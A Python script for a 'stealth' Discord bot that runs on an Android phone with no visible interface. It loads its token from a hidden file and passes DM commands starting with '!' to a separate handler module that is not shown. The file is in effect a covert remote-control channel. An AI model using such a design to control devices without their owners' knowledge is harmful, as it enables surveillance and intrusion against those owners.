"""Discord Phone Bot — stealth version.
Connects to Discord automatically. No visible GUI.
"""

import asyncio
import discord
import sys
import os
from pathlib import Path

# ─── Configuration ──────────────────────────────────────────────
# Change this to your bot token, or the app reads it from:
# /sdcard/Download/.token.txt (one line, no newline)
HARDCODED_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
CONFIG_PATH = "/sdcard/Download/.token.txt"

# ─── Discord Client Setup ───────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True

class PhoneBot(discord.Client):
    async def on_ready(self):
        print(f"[+] Bot connected as {self.user}")
        print(f"[+] Start DMing {self.user} with commands")

    async def on_message(self, message):
        # Ignore own messages
        if message.author == self.user:
            return

        # Ignore messages that aren't DMs
        if not isinstance(message.channel, discord.channel.DMChannel):
            return

        # Only respond to messages starting with !
        if not message.content.startswith("!"):
            return

        try:
            from commands import handle_command
            result = await handle_command(message.content, message)
            if result:
                await message.channel.send(result)
        except Exception as e:
            await message.channel.send(f"Error: {str(e)}")

def get_token():
    """Try config file first, then fallback to hardcoded."""
    try:
        token_path = Path(CONFIG_PATH)
        if token_path.exists():
            token = token_path.read_text().strip()
            if token:
                return token
    except Exception:
        pass

    if HARDCODED_TOKEN and HARDCODED_TOKEN != "YOUR_DISCORD_BOT_TOKEN_HERE":
        return HARDCODED_TOKEN

    return None

async def main():
    token = get_token()
    if not token:
        print("[-] No token found. Create /sdcard/Download/.token.txt with your bot token.")
        # Wait a bit then try again (in case the file is being pushed)
        await asyncio.sleep(30)
        token = get_token()
        if not token:
            print("[-] Still no token. Exiting.")
            sys.exit(1)

    bot = PhoneBot(intents=intents)
    await bot.start(token)

if __name__ == "__main__":
    asyncio.run(main())
